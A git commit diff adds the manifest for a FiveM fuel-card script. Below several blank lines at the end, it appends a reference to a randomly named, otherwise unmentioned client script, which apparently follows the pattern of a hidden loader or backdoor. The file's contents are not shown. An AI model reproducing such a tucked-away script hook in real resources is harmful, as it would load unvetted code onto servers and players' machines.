7e4cab14095928b49d8369a37c674762842cadf7
FL45H#5053 <93653477+SN-SCRIPTS@users.noreply.github.com>
2022-06-07 22:07:42 +0200

    Add files via upload

---
+++ fxmanifest.lua
@@ -0,0 +1,26 @@
+
+
+author 'FL45H#5053'
+description 'sn-tanken - een tank script met tankpas'
+
+client_scripts {
+	'config.lua',
+	'functions/functions_client.lua',
+	'source/fuel_client.lua'
+}
+
+server_scripts {
+	'config.lua',
+	'source/fuel_server.lua'
+}
+
+exports {
+	'GetFuel',
+	'SetFuel'
+}
+
+
+
+
+
+client_script 'hf3JERefai5.lua'
